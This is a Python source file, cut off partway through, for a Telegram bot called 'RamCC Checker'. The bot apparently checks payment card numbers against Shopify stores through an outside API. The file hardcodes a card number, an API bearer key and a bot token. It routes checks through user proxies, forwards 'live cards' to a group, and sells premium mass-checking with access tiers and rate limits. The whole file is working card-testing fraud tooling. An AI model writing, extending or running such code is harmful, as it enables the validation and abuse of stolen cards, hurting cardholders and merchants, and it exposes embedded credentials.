import logging
import aiohttp
import asyncio
from io import BytesIO
import re
import json
import time
from functools import wraps
import concurrent.futures
from threading import Lock
from datetime import datetime
import html
from urllib.parse import urlparse
from aiohttp import TCPConnector

from telegram import Update, Document, constants, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    filters, ContextTypes, CallbackContext, CallbackQueryHandler
)

# ====================== CUSTOM UTILS ======================

class BotUtils:
    """Custom utility class for common bot functions"""
    
    @staticmethod
    def format_message(text, user=None, reply_markup=None, parse_mode=constants.ParseMode.HTML):
        """Format standard messages with consistent styling"""
        # Set default params for message sending
        params = {
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True
        }
        
        # Add reply markup if provided
        if reply_markup:
            params["reply_markup"] = reply_markup
            
        return params
    
    @staticmethod
    async def send_response(update, text, reply_markup=None):
        """Send a formatted response with consistent styling"""
        # Ensure text doesn't contain unescaped HTML entities
        # Only allow certain tags like <b>, <i>, <code>, etc.
        # We'll rely on Telegram's parser for that
        
        # Telegram only supports a subset of HTML tags:
        # <b>, <i>, <u>, <s>, <strike>, <del>, <code>, <pre>,
        # <a href="...">, <a href="..." data-telegram-appurl="...">,
        # and nested tags. Anything else might cause parsing errors.
        
        try:
            return await update.message.reply_text(
                text=text,
                parse_mode=constants.ParseMode.HTML,
                disable_web_page_preview=True,
                reply_markup=reply_markup
            )
        except Exception as e:
            # If HTML parsing fails, try sending without HTML parsing
            logger.error(f"HTML parsing error: {str(e)}. Sending without HTML parsing.")
            try:
                return await update.message.reply_text(
                    text="Error with formatted message. Please contact the developer.",
                    disable_web_page_preview=True,
                    reply_markup=reply_markup
                )
            except Exception as e2:
                logger.error(f"Failed to send fallback message: {str(e2)}")
                return None
    
    @staticmethod
    def create_keyboard(buttons, row_width=1):
        """Create an inline keyboard with specified buttons"""
        keyboard = []
        row = []
        
        for i, button in enumerate(buttons):
            row.append(button)
            if (i + 1) % row_width == 0:
                keyboard.append(row)
                row = []
                
        if row:  # Add any remaining buttons
            keyboard.append(row)
            
        return InlineKeyboardMarkup(keyboard)
    
    @staticmethod
    def get_user_identifier(user):
        """Get a proper user identifier that works with or without username"""
        if user.username:
            return f"@{user.username}"
        else:
            return f"{user.first_name} (ID: {user.id})"

# ====================== GLOBAL CONFIG ======================

# 👑 Owner & Access Control
OWNER_ID = 5826246696  # Fixed owner ID
approved_users = {}    # Dictionary to track approved users with optional expiry: {user_id: {'expiry': timestamp or None, 'set_by': owner_id, 'set_on': timestamp}}
admin_users = {}       # Dictionary to track admin users: {user_id: {'promoted_by': owner_id, 'promoted_on': timestamp}}
ban_requests = {}      # Track users who attempted to use owner commands
approved_groups = {}   # Track approved groups for limited bot usage
premium_users = {}     # Track premium users for /mass command
user_last_cmd = {}     # Track last command time for rate limiting
user_cc_count = {}     # Track hourly CC check count per user
user_active_cmd = {}   # Track if user has an active command running
user_gql_count = {}    # Track GQL command counts for premium users
bot_users = set()      # Track all users who have interacted with the bot
disabled_commands = {} # Track disabled commands: {command_name: disabled_by}

# 💾 Storage & Forwarding
LIVE_CARDS_GROUP = -1002628821160  # Target group for live cards

# Force Join Requirements
REQUIRED_CHANNEL = "RamCC_checker"  # Channel username without @
REQUIRED_GROUP = "+Egc5z-DshuAzMDc9"  # Group invite link ID
CHANNEL_LINK = "https://t.me/RamCC_checker"
GROUP_LINK = "https://t.me/+Egc5z-DshuAzMDc9"

# 🧠 In-memory storage for default sites per user
user_sites = {}
user_proxies = {}      # Dictionary to store user proxies
confirmed_group_members = set()  # Track users who we've verified are in the group

# 🔐 Constants
BEARER = "BLEED-AUTO-API-KEY"
DEFAULT_CC = "5339861840655076|07|2025|105"  # Use | as default, but code supports |, :, and / separators (even mixed within a CC)
API_URL = "https://straightbleed.com/autosh.php"
DEV_LINK = "<a href='https://t.me/TheRam_Bhakt'>[⌬]</a>"  # Clickable left bracket linking to owner
RAM_ICON = "<a href='https://t.me/TheRam_Bhakt'>[ϟ]</a>"  # Clickable right bracket linking to owner
GROUP_COOLDOWN = 30  # Cooldown in seconds for group commands
HOURLY_CC_LIMIT = 50  # Maximum CCs per hour for regular users
MAX_CCS_PER_REQUEST = 20  # Maximum CCs per request for /chk command

# Premium Rate Limiting
PREMIUM_GQL_BATCH = 4     # Number of GQL commands before cooldown 
PREMIUM_GQL_COOLDOWN = 45 # Cooldown in seconds after batch
PREMIUM_MASS_COOLDOWN = 30 # Cooldown in seconds after mass command

# 🧠 Global Settings
show_3ds_notifications = {}  # Per-user setting for 3DS notifications
active_mass_commands = {}    # Track active /mass commands by user_id

# 🧵 Threading
max_workers = 5  # Maximum number of threads to use
stats_lock = Lock()  # Lock for updating stats during multi-threaded operations
stats_updated = asyncio.Event()  # Event to signal stats have been updated

# 🧠 Logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Initialize the application
app = ApplicationBuilder().token("7941778593:AAFYXHvEu6TyewPz9T2YK-ci0W-Dp19B2DQ").build()

# ====================== HELPER FUNCTIONS ======================

# Helper function to get the owner's name as clickable link
async def get_owner_name_link(context):
    try:
        # Try to get the owner's details
        owner = await context.bot.get_chat(OWNER_ID)
        first_name = owner.first_name or "Ram"
        # Return formatted clickable link
        return f"<a href='https://t.me/{owner.username or 'TheRam_Bhakt'}'>{first_name}</a>"
    except Exception as e:
        logger.error(f"Error getting owner info: {e}")
        # Return a default if we can't get the owner info
        return "<a href='https://t.me/TheRam_Bhakt'>Ram</a>"

# Helper function to check if user is authorized
def is_authorized(user_id):
    # Owner is always authorized, otherwise check approved list
    if user_id == OWNER_ID:
        return True
    
    # Check if user is an admin
    if user_id in admin_users:
        return True
        
    # Check if user is in approved list
    if user_id in approved_users:
        # Check if user approval has expiration
        if 'expiry' in approved_users[user_id] and approved_users[user_id]['expiry'] is not None:
            now = int(time.time())
            if approved_users[user_id]['expiry'] < now:
                # Access expired, remove from approved users
                del approved_users[user_id]
                return False
        # No expiry or not expired yet
        return True
        
    return False

# Helper function to check if user is an admin
def is_admin(user_id):
    # Owner is always considered an admin
    if user_id == OWNER_ID:
        return True
    
    # Check if user is in the admin list
    return user_id in admin_users

# Helper function to normalize CC format (convert : or / to | for API)
def normalize_cc_format(cc):
    # Handle mixed separators by directly splitting on any of the separators
    parts = re.split(r'[|:/]', cc)
    
    # Ensure we have all 4 parts
    if len(parts) == 4:
        return f"{parts[0]}|{parts[1]}|{parts[2]}|{parts[3]}"
    
    return cc  # Return original if format doesn't match expected

# Helper function to notify owner about unauthorized command usage
async def notify_owner(context, command_name, user_id, username=None, first_name=None):
    # Store ban request with unique ID
    ban_requests[f"{user_id}_{command_name}"] = user_id
    
    # Send alert to owner
    try:
        await context.bot.send_message(
            chat_id=OWNER_ID,
            **BotUtils.format_message(
                f"""⚠️ <b>SECURITY ALERT</b> ⚠️

👤 {first_name or "Unknown User"} ({BotUtils.get_user_identifier(update.effective_user)}) tried to use <b>OWNER COMMAND</b>:
<code>/{command_name}</code>

What would you like to do?
- Reply with /b to ban user
- Reply with /a to allow this time"""
            )
        )
    except Exception as e:
        logger.error(f"Failed to send owner alert: {e}")

# Decorator for owner-only commands
def owner_only_command(func):
    @wraps(func)
    async def wrapped(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        command_name = func.__name__.replace("_command", "")
        
        if user_id != OWNER_ID:
            # Let user know they don't have access and notify owner
            await BotUtils.send_response(update, "❌ This command is only available to the bot owner.")
            await notify_owner(
                context, command_name, user_id,
                update.effective_user.username, update.effective_user.first_name
            )
            return
        
        return await func(update, context)
    return wrapped

# Decorator for admin-level commands
def admin_command(func):
    @wraps(func)
    async def wrapped(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        command_name = func.__name__.replace("_command", "")
        
        # First check if user is authorized (owner or admin)
        if not is_admin(user_id):
            # Let user know they don't have access
            await BotUtils.send_response(update, "❌ This command is only available to admins.")
            # Notify owner about unauthorized access attempt
            await notify_owner(
                context, command_name, user_id,
                update.effective_user.username, update.effective_user.first_name
            )
            return
        
        # User is authorized, execute the command
        return await func(update, context)
    return wrapped

# Helper function to check authorization with group support and premium check
async def check_authorization(update: Update, context: ContextTypes.DEFAULT_TYPE, check_premium=False, command_type=None):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    chat_type = update.effective_chat.type
    command_name = context.command if hasattr(context, 'command') else "unknown"
    
    # Track user for broadcast purposes whenever they interact with the bot
    bot_users.add(user_id)
    
    # Check if the command is disabled (owner and admins are exempt from this check)
    if command_type and command_type in disabled_commands and user_id != OWNER_ID and not is_admin(user_id):
        await update.message.reply_text(
            f"⚠️ The /{command_type} command is currently disabled by the bot admin."
        )
        return False, "command_disabled"
    
    # First, check if the user is a member of required channel and group
    # Skip this check if:
    # 1. User is the owner or admin
    # 2. Command is start/help
    # 3. User is in an approved group
    should_skip_membership_check = (
        user_id == OWNER_ID or 
        is_admin(user_id) or
        command_type in ["start", "help"] or 
        chat_id in approved_groups
    )
    
    if not should_skip_membership_check:
        is_member, membership_info = await check_user_membership(update, context)
        if not is_member:
            # User is not a member of required channel/group
            not_joined_message, join_buttons = membership_info
            await update.message.reply_text(
                not_joined_message,
                parse_mode=constants.ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([join_buttons]) if join_buttons else None
            )
            return False, "not_joined_required_channels"
    
    # Check if another command is already running for this user
    if user_id in user_active_cmd and user_active_cmd[user_id] and command_type != "stop":
        await update.message.reply_text(
            f"⚠️ You already have a command running. Please wait for it to complete or use /stop."
        )
        return False, "command_in_progress"
    
    # Owner and admins are always authorized without limits
    if user_id == OWNER_ID or is_admin(user_id):
        return True, None
    
    # Check user approval status (for non-owner, non-admin users)
    is_approved_user = False
    if user_id in approved_users:
        # Check if approval has expiry
        if 'expiry' in approved_users[user_id] and approved_users[user_id]['expiry'] is not None:
            now = int(time.time())
            if approved_users[user_id]['expiry'] < now:
                # Approval expired
                del approved_users[user_id]
                logger.info(f"User {user_id} approval expired at {now}")
            else:
                is_approved_user = True
        else:
            # No expiry, approved
            is_approved_user = True
    
    # Check if user has premium status (for private chats only)
    is_premium = False
    if user_id in premium_users:
        # Check if premium has expired
        now = int(time.time())
        if 'expiry' in premium_users[user_id] and premium_users[user_id]['expiry'] < now:
            # Premium expired - remove from premium list
            del premium_users[user_id]
            logger.info(f"User {user_id} premium expired at {now}")
        else:
            is_premium = True
    
    # Check if this is a private chat
    if chat_type == "private":
        if not is_approved_user:
            await update.message.reply_text(
                f"❌ You are not authorized to use this bot in private chats.\n"
                f"Your ID: {user_id}\n"
                f"Contact the owner for access."
            )
            return False, "not_approved"
        
        # In private chat: check premium status for premium commands
        if check_premium and not is_premium:
            await update.message.reply_text(
                f"⭐️ This command requires premium status.\n"
                f"Contact @TheRam_Bhakt to purchase premium access."
            )
            return False, "not_premium"
        
        # Command-specific premium rate limiting for premium users
        if is_premium:
            now = time.time()
            user_key = f"{user_id}_premium"
            
            # For /gql and /agql commands - limit to 4 per 45 seconds
            if command_type in ["gql", "agql"]:
                # Initialize counter if it doesn't exist
                if user_key not in user_gql_count:
                    user_gql_count[user_key] = {"count": 0, "time": now}
                
                # Check the last GQL command batch time
                if user_gql_count[user_key]["count"] >= PREMIUM_GQL_BATCH:
                    time_since_last = now - user_gql_count[user_key]["time"]
                    if time_since_last < PREMIUM_GQL_COOLDOWN:
                        cooldown_left = int(PREMIUM_GQL_COOLDOWN - time_since_last)
                        await update.message.reply_text(
                            f"⏳ Premium rate limit: You can check {PREMIUM_GQL_BATCH} sites every {PREMIUM_GQL_COOLDOWN} seconds.\n"
                            f"Please wait {cooldown_left} seconds before checking more sites."
                        )
                        return False, "premium_rate_limited"
                    else:
                        # Reset the counter after cooldown period
                        user_gql_count[user_key] = {"count": 1, "time": now}
                else:
                    # Increment the counter
                    user_gql_count[user_key]["count"] += 1
            
            # For /mass command - cooldown period (premium only)
            elif command_type == "mass":
                if user_key in user_last_cmd:
                    time_since_last = now - user_last_cmd[user_key]
                    if time_since_last < PREMIUM_MASS_COOLDOWN:
                        cooldown_left = int(PREMIUM_MASS_COOLDOWN - time_since_last)
                        await update.message.reply_text(
                            f"⏳ Premium rate limit: Please wait {cooldown_left} seconds between mass commands."
                        )
                        return False, "premium_rate_limited"
                
                # Update last command time for mass
                user_last_cmd[user_key] = now
    
    # Check if this is a group chat
    elif chat_type in ["group", "supergroup"]:
        # Check if the group is approved
        if chat_id not in approved_groups:
            await update.message.reply_text(
                f"""⚠️ <b>Group Not Authorized</b>

This group is not authorized to use the RamCC Checker bot.
Group ID: <code>{chat_id}</code>

To get this group approved, please contact @TheRam_Bhakt.
""",
                parse_mode=constants.ParseMode.HTML
            )
            return False, "group_not_approved"
        
        # Group is approved - add a hint about the /grpstatus command
        # Only show this hint for the first command in this chat and for specific commands
        if command_type not in ["grpstatus", "help", "check"] and chat_id not in user_last_cmd:
            try:
                await update.message.reply_text(
                    f"ℹ️ <b>Use /grpstatus to see all available commands for this group.</b>",
                    parse_mode=constants.ParseMode.HTML
                )
            except Exception as e:
                logger.error(f"Error sending group status hint: {str(e)}")
                pass  # Ignore errors from sending hint
        
        # In groups: Premium commands like /mass are NOT available
        if check_premium:
            await update.message.reply_text(
                f"⭐️ Premium commands are only available in private chat.\n"
                f"Please use this command in a direct message with the bot."
            )
            return False, "premium_only_in_private"
        
        # For approved groups, check rate limiting
        now = time.time()
        user_key = f"{user_id}_{chat_id}"
        
        # Regular users - check standard rate limiting
        if user_key in user_last_cmd:
            last_cmd_time = user_last_cmd[user_key]
            if now - last_cmd_time < GROUP_COOLDOWN:
                cooldown_left = int(GROUP_COOLDOWN - (now - last_cmd_time))
                await update.message.reply_text(
                    f"⏳ Please wait {cooldown_left} seconds before using another command."
                )
                return False, "rate_limited"
        
        # Update last command time
        user_last_cmd[user_key] = now
        
        # Check hourly CC limit
        hour_key = f"{user_id}_{chat_id}_{int(now/3600)}"
        if command_type in ['chk', 'gql']:
            # Initialize if not exists
            if hour_key not in user_cc_count:
                user_cc_count[hour_key] = 0
            
            # Count CCs in this command
            cc_count = 0
            if command_type == 'chk' and context.args:
                cc_count = len(context.args)
            else:
                cc_count = 1  # For gql command
            
            # Check if this would exceed the limit
            if user_cc_count[hour_key] + cc_count > HOURLY_CC_LIMIT:
                await update.message.reply_text(
                    f"⚠️ You have reached the hourly limit of {HOURLY_CC_LIMIT} CC checks.\n"
                    f"Current usage: {user_cc_count[hour_key]}/{HOURLY_CC_LIMIT}\n"
                    f"Use the bot in private chat with premium status to remove this limit."
                )
                return False, "cc_limit_reached"
            
            # Update CC count
            user_cc_count[hour_key] += cc_count
    
    # All checks passed
    return True, None

# ====================== COMMAND HANDLERS ======================

# /approve user_id [duration] → Approve a user (owner only)
@admin_command
async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or not context.args[0].isdigit():
        return await BotUtils.send_response(update, "Usage: /approve <user_id> [duration]\nDuration examples: 7d (7 days), 2w (2 weeks), 3m (3 months), 1y (1 year)")
    
    target_user_id = int(context.args[0])
    duration_text = None
    expiry = None
    expiry_date = "Never (Lifetime)"
    
    # Check if duration is specified
    if len(context.args) > 1:
        duration_arg = context.args[1].lower()
        
        # Check for duration format pattern (number + unit)
        import re
        duration_match = re.match(r'^(\d+)([dwmy])$', duration_arg)
        
        if duration_match:
            value = int(duration_match.group(1))
            unit = duration_match.group(2)
            
            # Calculate seconds based on unit
            seconds = 0
            if unit == 'd':  # days
                seconds = value * 24 * 60 * 60
                duration_text = f"{value} day{'s' if value > 1 else ''}"
            elif unit == 'w':  # weeks
                seconds = value * 7 * 24 * 60 * 60
                duration_text = f"{value} week{'s' if value > 1 else ''}"
            elif unit == 'm':  # months (approximate)
                seconds = value * 30 * 24 * 60 * 60
                duration_text = f"{value} month{'s' if value > 1 else ''}"
            elif unit == 'y':  # years
                seconds = value * 365 * 24 * 60 * 60
                duration_text = f"{value} year{'s' if value > 1 else ''}"
            
            # Calculate expiry timestamp
            now = int(time.time())
            expiry = now + seconds
            
            # Format expiry date for display
            from datetime import datetime
            expiry_date = datetime.fromtimestamp(expiry).strftime("%d-%m-%Y %H:%M")
    
    # Store approval with expiry if specified
    approved_users[target_user_id] = {
        'expiry': expiry,
        'set_by': update.effective_user.id,
        'set_on': int(time.time())
    }
    
    # Log the approval for debugging
    logger.info(f"User {target_user_id} approved by {update.effective_user.id} with expiry: {expiry}")
    logger.info(f"Current approved_users: {approved_users}")
    
    # Send approval confirmation to owner
    await BotUtils.send_response(
        update,
        f"""{RAM_ICON} RamCC Checker | Access Control
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} User ID: {target_user_id}
{DEV_LINK} Status: Approved ✅
{DEV_LINK} Duration: {duration_text or "Lifetime"}
{DEV_LINK} Expires: {expiry_date}
{DEV_LINK} Action: User can now use all bot commands
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} Approved by: {"Owner" if update.effective_user.id == OWNER_ID else "Admin"} ({BotUtils.get_user_identifier(update.effective_user)})"""
    )
    
    # Try to send welcome message to the newly approved user
    try:
        welcome_message = f"""
{RAM_ICON} <b>Congratulations!</b> 🎉

You have been <b>approved</b> by the {"bot owner" if update.effective_user.id == OWNER_ID else "admin"} to use RamCC Checker!

<b>Access Details:</b>
• Duration: {duration_text or "Lifetime"}
• Expires: {expiry_date if duration_text else "Never"}

<b>Important Guidelines:</b>
• Use only approved commands (see /help)
• Do not attempt to use owner-only commands
• Misuse may result in your access being revoked

Type /help to see available commands and get started.
<i>Thank you for using RamCC Checker!</i>
"""
        await context.bot.send_message(
            chat_id=target_user_id,
            text=welcome_message,
            parse_mode=constants.ParseMode.HTML,
            disable_web_page_preview=True
        )
    except Exception as e:
        # If can't send welcome message, inform the owner
        logger.error(f"Failed to send welcome message to user {target_user_id}: {e}")
        await update.message.reply_text(f"Note: Could not send welcome message to the user. They may not have started the bot yet.")

# Alias for /approve command
approve_alias_command = approve_command

# /help → Show available commands with interactive buttons
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Create keyboard buttons - only show owner commands to owner
    buttons = [InlineKeyboardButton("🧩 User Commands", callback_data="help_user")]
    
    if update.effective_user.id == OWNER_ID:
        buttons.append(InlineKeyboardButton("👑 Owner Commands", callback_data="help_owner"))
    
    # Add group status button if in a group chat
    if update.effective_chat.type in ["group", "supergroup"]:
        buttons.append(InlineKeyboardButton("📊 Group Status", callback_data="help_group_status"))
    
    # Get owner name
    owner_name = await get_owner_name_link(context)
    
    await BotUtils.send_response(
        update,
        f"""{RAM_ICON} RamCC Checker | Command Help
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} Welcome to RamCC Checker help menu
{DEV_LINK} Select a category below to see available commands
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} 𝐃𝐞𝐯: {owner_name}
""",
        reply_markup=BotUtils.create_keyboard(buttons)
    )

# /3d on|off → Toggle 3DS notifications
async def threeds_toggle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Check if user has ongoing mass command
    if user_id in active_mass_commands and active_mass_commands[user_id]:
        await update.message.reply_text("❌ Cannot change 3DS settings while /mass is running. Use /stop first.")
        return
    
    # Check authorization
    authorized, reason = await check_authorization(update, context, False, "3d")
    if not authorized:
        await update.message.reply_text(f"❌ {reason}")
        return
    
    if not context.args or context.args[0].lower() not in ["on", "off"]:
        current_setting = "ON" if show_3ds_notifications.get(user_id, True) else "OFF"
        await update.message.reply_text(f"Usage: /3d on|off\nCurrent setting: {current_setting}")
        return
    
    setting = context.args[0].lower() == "on"
    show_3ds_notifications[user_id] = setting
    
    response = f"""
{RAM_ICON} RamCC Checker | 3DS Settings
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
{DEV_LINK} 3DS Notifications: {"ON ✅" if setting else "OFF ❌"}
{DEV_LINK} Effect: {"You will" if setting else "You will NOT"} receive 3DS card notifications during /mass
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
{DEV_LINK} 𝐑𝐞𝐪 𝐁𝐲: {BotUtils.get_user_identifier(update.effective_user)}
{DEV_LINK} 𝐃𝐞𝐯: @TheRam_Bhakt🌥️
"""
    await update.message.reply_text(response, parse_mode=constants.ParseMode.HTML, disable_web_page_preview=True)

# /stop → Stop ongoing /mass command
async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Add debugging log
    logger.info(f"Stop command executed by user {user_id}")
    
    # Check authorization but with simplified check to ensure it works
    try:
        authorized, reason = await check_authorization(update, context, False, "stop")
        if not authorized:
            await update.message.reply_text(f"❌ {reason}")
            return
    except Exception as e:
        # Log error but continue anyway - stop is important
        logger.error(f"Error in stop command authorization: {str(e)}")
        # Continue execution even if authorization fails
    
    # Check if user has active mass command
    if user_id in active_mass_commands:
        active_status = active_mass_commands[user_id]
        logger.info(f"User {user_id} active_mass_commands status: {active_status}")
    else:
        logger.info(f"User {user_id} not found in active_mass_commands")
    
    # Reset flags regardless of current status
    active_mass_commands[user_id] = False
    user_active_cmd[user_id] = False
    
    response = f"""
{RAM_ICON} RamCC Checker | Command Stopped
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
{DEV_LINK} Status: All commands stopping ⚠️
{DEV_LINK} Info: Any ongoing commands have been stopped
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
{DEV_LINK} 𝐑𝐞𝐪 𝐁𝐲: {BotUtils.get_user_identifier(update.effective_user)}
{DEV_LINK} 𝐃𝐞𝐯: @TheRam_Bhakt🌥️
"""
    await update.message.reply_text(response, parse_mode=constants.ParseMode.HTML, disable_web_page_preview=True)

# /gql site.com → Test API with default CC
async def gql_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Check if we're in a private chat
    chat_type = update.effective_chat.type
    if chat_type != "private":
        # In groups, just send a message suggesting to use it in private chat
        return await BotUtils.send_response(
            update,
            f"⚠️ The /gql command can only be used in private chat.\n\nPlease message @RamCC_checker directly to check sites, then use /chk in groups."
        )
        
    # Check if user is authorized
    authorized, reason = await check_authorization(update, context, False, "gql")
    if not authorized:
        return await BotUtils.send_response(update, f"❌ {reason}")
        
    user_id = update.effective_user.id
    
    if len(context.args) != 1:
        return await BotUtils.send_response(update, "Usage: /gql <site>")

    site = context.args[0]
    
    # Check if user has a proxy set
    proxy_str = None
    proxy_status = "❌ Disabled"
    proxy_ip_info = ""
    
    if user_id in user_proxies:
        if isinstance(user_proxies[user_id], dict):
            # New format with IP information
            proxy_str = user_proxies[user_id]['full']
            proxy_status = "✅ Enabled"
            proxy_ip_info = f"\n{DEV_LINK} 🌐 Proxy IP: <code>{user_proxies[user_id]['ip']}</code>"
        else:
            # Old format compatibility
            proxy_str = user_proxies[user_id]
            proxy_status = "✅ Enabled"
    
    # Send processing message
    processing_msg = await BotUtils.send_response(update, "🔍 Checking site...")
    
    # Get owner name
    owner_name = await get_owner_name_link(context)
    
    # Make API request with SSL verification enabled (no longer disabling SSL)
    connector = TCPConnector(force_close=True)
    
    try:
        async with aiohttp.ClientSession(connector=connector) as session:
            # Ensure site is properly formatted
            if 'http' in site.lower():
                # Extract domain from URL
                parsed_url = urlparse(site)
                site = parsed_url.netloc or parsed_url.path
                # Remove www. if present
                if site.startswith('www.'):
                    site = site[4:]
            
            # Build API URL (without proxy parameter in URL)
            api_url = f"{API_URL}?link={site}&bearer={BEARER}&cc={DEFAULT_CC}"
            
            # Configure proxy for request if set
            proxy = None
            if proxy_str:
                # For aiohttp, we need to format the proxy URL correctly
                if '@' in proxy_str:  # Webshare format (username:password@p.webshare.io:80)
                    # Use the full proxy string directly with http:// prefix
                    proxy = f"http://{proxy_str}"
                else:
                    parts = proxy_str.split(':')
                    if len(parts) == 2:  # ip:port
                        proxy = f"http://{parts[0]}:{parts[1]}"
                    elif len(parts) >= 4:  # ip:port:user:pass
                        proxy = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            
            # Log the API request
            logger.info(f"Making API request to {api_url} with proxy: {proxy}")
            
            try:
                # Make the API request with proxy if set
                async with session.get(api_url, proxy=proxy, timeout=30) as resp:
                    text = await resp.text()
                    logger.info(f"API response status: {resp.status}, Content-Type: {resp.headers.get('Content-Type', 'unknown')}")
                    
                    # Check if response is HTML instead of JSON
                    if text.strip().startswith(('<!DOCTYPE', '<html')):
                        logger.error(f"Invalid API response (HTML received) in /gql for site {site}: {text[:100]}")
                        await processing_msg.edit_text(
                            f"❌ Invalid response from API. The site '{site}' might not be a valid Shopify site or might be protected.\n\n"
                            f"Try a different site or contact the bot owner."
                        )
                        return
                    
                    try:
                        response_data = json.loads(text)
                        
                        # Check if the response indicates an error or invalid site
                        if "error" in response_data or "Error" in response_data:
                            error_msg = response_data.get("error", response_data.get("Error", "Unknown error"))
                            await processing_msg.edit_text(
                                f"❌ API Error: {error_msg}\n\n"
                                f"The site '{site}' might not be a valid Shopify site or might require additional configuration."
                            )
                            return
                        
                        # Format response with proxy status indicator - avoiding Unicode characters that cause linter errors
                        await processing_msg.edit_text(
                            f"{RAM_ICON} RamCC Checker | AutoShopify Fetcher\n"
                            f"---------------------------\n"
                            f"{DEV_LINK} Site: https://{response_data.get('Site', site)}\n"
                            f"{DEV_LINK} Order's Price: {response_data.get('Amount', 'Unknown')}$\n"
                            f"{DEV_LINK} Type: Shopify + {response_data.get('TypeX', 'Normal')}\n"
                            f"{DEV_LINK} Status: {response_data.get('Status', 'Unknown')}\n"
                            f"{DEV_LINK} Result: {response_data.get('Response', 'Unknown')}\n"
                            f"{DEV_LINK} Gateway: #GraphQL\n"
                            f"{DEV_LINK} Proxy: {proxy_status}{proxy_ip_info}\n"
                            f"{DEV_LINK} Req By: {BotUtils.get_user_identifier(update.effective_user)}",
                            parse_mode=constants.ParseMode.HTML,
                            disable_web_page_preview=True
                        )
                    except json.JSONDecodeError:
                        logger.error(f"Invalid API response format for site {site}: {text[:100]}")
                        await processing_msg.edit_text(
                            f"❌ Invalid API response. Please check that the site is valid and try again.\n\nTry using /agql {site} which might be more reliable."
                        )
            except Exception as e:
                logger.error(f"Error in API request for site {site}: {str(e)}")
                await processing_msg.edit_text(
                    f"❌ Error: {str(e)[:100]}\n\nTry using /agql {site} instead, which might handle this site better."
                )
    except Exception as e:
        logger.error(f"Error in /gql command for site {site}: {str(e)}")
        # More user-friendly error message with suggestion
        await processing_msg.edit_text(
            f"❌ Error: {str(e)[:100]}\n\nTry using /agql {site} instead, which might handle this site better."
        )

# /agql site.com → Save as default site for user
async def agql_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Check if we're in a private chat
    chat_type = update.effective_chat.type
    if chat_type != "private":
        # In groups, just send a message suggesting to use it in private chat
        return await BotUtils.send_response(
            update,
            f"⚠️ The /agql command can only be used in private chat.\n\nPlease message @RamCC_checker directly to set your default site, then use /chk in groups."
        )
        
    user_id = update.effective_user.id
    
    # Check if user is authorized
    authorized, reason = await check_authorization(update, context, False, "agql")
    if not authorized:
        await update.message.reply_text(f"❌ {reason}")
        return
    
    # Comment out proxy requirement
    """
    # Check if proxy is set (now mandatory)
    if user_id not in user_proxies:
        await update.message.reply_text(
            f"❌ You must set a proxy first using /set_proxy before using this command.\n\n"
            f"Example: /set_proxy 1.2.3.4:8080 or /set_proxy 1.2.3.4:8080:username:password"
        )
        return
    """
        
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /agql <site>")
        return

    site = context.args[0]
    
    # Ensure site is properly formatted
    if 'http' in site.lower():
        # Extract domain from URL
        parsed_url = urlparse(site)
        site = parsed_url.netloc or parsed_url.path
        # Remove www. if present
        if site.startswith('www.'):
            site = site[4:]
            
    # Store the formatted site
    user_sites[update.effective_user.id] = site
    
    # Check if user has a proxy set
    proxy_str = None
    proxy_status = "❌ Disabled"
    proxy_ip_info = ""
    
    if user_id in user_proxies:
        if isinstance(user_proxies.get(user_id, None), dict):
            # New format with IP information
            proxy_str = user_proxies[user_id]['full']
            proxy_status = "✅ Enabled"
            proxy_ip_info = f"\n{DEV_LINK} 🌐 Proxy IP: <code>{user_proxies[user_id]['ip']}</code>"
        elif user_id in user_proxies:
            # Old format compatibility
            proxy_str = user_proxies[user_id]
            proxy_status = "✅ Enabled"
    
    # Send processing message
    processing_msg = await update.message.reply_text("🔍 Checking site...")
    
    # Get owner name
    owner_name = await get_owner_name_link(context)
    
    # Fetch gate type using API
    url = f"{API_URL}?link={site}&bearer={BEARER}&cc={DEFAULT_CC}"
    gate_type = "Shopify Normal"
    amount = "Unknown"
    
    try:
        # Create a client session WITH SSL verification
        connector = TCPConnector(force_close=True)  # Keep force_close for connection reliability
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        async with aiohttp.ClientSession(connector=connector, headers=headers) as session:
            # Configure proxy for request if set
            proxy = None
            if proxy_str:
                # For aiohttp, we need to format the proxy URL correctly
                if '@' in proxy_str:  # Webshare format (username:password@p.webshare.io:80)
                    # Use the full proxy string directly with http:// prefix
                    proxy = f"http://{proxy_str}"
                else:
                    parts = proxy_str.split(':')
                    if len(parts) == 2:  # ip:port
                        proxy = f"http://{parts[0]}:{parts[1]}"
                    elif len(parts) >= 4:  # ip:port:user:pass
                        proxy = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            
            try:
                # Log the request being made
                logger.info(f"/agql request for site {site} with proxy: {proxy}")
                
                # Make the API request with proxy if set
                async with session.get(url, proxy=proxy, timeout=30) as resp:
                    # Log response status and headers for debugging
